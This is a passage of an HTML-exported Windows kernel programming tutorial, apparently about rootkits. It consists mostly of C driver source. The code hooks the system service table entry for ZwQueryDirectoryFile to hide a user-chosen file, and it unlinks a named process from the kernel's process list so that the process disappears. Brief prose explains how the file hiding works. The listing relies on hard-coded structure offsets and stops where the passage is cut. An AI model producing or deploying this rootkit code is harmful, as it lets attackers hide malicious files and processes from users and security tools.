style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
cli<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
sti<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoDeleteSymbolicLink(&amp;gSymbolicLinkName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoDeleteDevice(gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
1&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gDeviceName,L&quot;\\Device\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gSymbolicLinkName,L&quot;\\DosDevices\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateDevice
(driverObject,0,&amp;gDeviceName,FILE_DEVICE_UNKNOWN,0,0,&amp;gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateSymbolicLink(&amp;gSymbolicLinkName,
&amp;gDeviceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (char *) ZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no
= *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQueryDirectoryFile=
(qtype)KeServiceDescriptorTable. ServiceTableBase [no];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
cli<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
sti<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
program is more generic. We run the loader as y –I calc.exe and it hides
calc.exe for us. Lets see the changes made in each function. In DriverEntry
there is nothing new that we have done before. We simply create the symbolic
link so that we can have our ring 3 program talk to us. In DriverUnload we
simply delete the links as if we do not, a fresh copy of the driver does not
get loaded.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the DriverDispatcher code we first extract the name of the program in variable
inputBuffer and the length in inputBufferLength. As we have a ASCII string we
first copy this non null terminated string in a buffer filename using strncpy
and not strcpy using inputBufferLength as the no bytes to copy. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Then
we null terminate this buffer and then use the Rtl functions to first give us a
ANSI string and then a unicode string. We use the unicode string to compare the
file name in the NewZwQueryDirectoryFile function. This is how we convert the
ascii string passed from ring 3 to a unicode string in ring 0. Finally in the
wcsncmp function we use the uStr.Buffer for the name of the file to compare.
Thus we have a more generic file name hiding program.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P66<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;string.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
process<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
a[156];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*Flink,*Blink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
process *proc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
startpid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
inputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
gDeviceName,gSymbolicLinkName,uStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PDEVICE_OBJECT
gpDeviceObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
filename[100];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
NextEntryOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileIndex;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
CreationTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
LastAccessTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
LastWriteTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
ChangeTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
EndOfFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
AllocationSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileAttributes;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileNameLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
EaSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>CCHAR
ShortNameLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WCHAR
ShortName[12];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WCHAR
FileName[1];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}FILE_BOTH_DIR_INFORMATION;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int *ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int *ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
short uFileName[128];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI
NTSTATUS NTAPI ZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
NTSTATUS (*qtype)(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE IoApcRoutine,<span
style="mso-spacerun: yes">   </span>PVOID IoApcContext,<span
style="mso-spacerun: yes">     </span>PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
OldZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
rc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=OldZwQueryDirectoryFile(hFile,hEvent,IoApcRoutine,IoApcContext,pIoStatusBlock,FileInformationBuffer,FileInformationBufferLength,FileInfoClass,bReturnOnlyOneEntry,PathMask,bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;FileInfoClass=%d
rc=%d\n&quot;,FileInfoClass,rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
rc == 0 &amp;&amp; FileInfoClass == 3)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>FILE_BOTH_DIR_INFORMATION
*p,*prev;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
last = 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= prev = (FILE_BOTH_DIR_INFORMATION *)FileInformationBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(!last)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>last
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>wcsncpy(uFileName,p-&gt;FileName,p-&gt;FileNameLength/2);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>uFileName[p-&gt;FileNameLength/2]
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%S
Delta=%d&quot;,uFileName,p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( wcsncmp(p-&gt;FileName,uStr.Buffer,inputBufferLength)<span
style="mso-spacerun: yes">  </span>== 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;Match
Found prev=%d p=%d last=%d&quot;,prev-&gt;NextEntryOffset,p-&gt;NextEntryOffset,last);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryOffset
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryOffset
= prev-&gt;NextEntryOffset + p-&gt;NextEntryOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev
= p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (FILE_BOTH_DIR_INFORMATION *)((char *)p + (int)p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>proc=
(struct process *) PsGetCurrentProcess ();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;proc=%x
name=%s&quot;,proc,filename);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>startpid
= proc-&gt;pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while
(1)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( strncmp(filename,(char *)proc + 508,inputBufferLength) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>proc
= (struct process *)( (char *)proc-&gt;Flink - 160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( startpid == proc-&gt;pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( startpid != proc-&gt;pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>*((long
*)proc-&gt;Blink) = (long) proc-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(rc);<o:p></o:p></span></p>

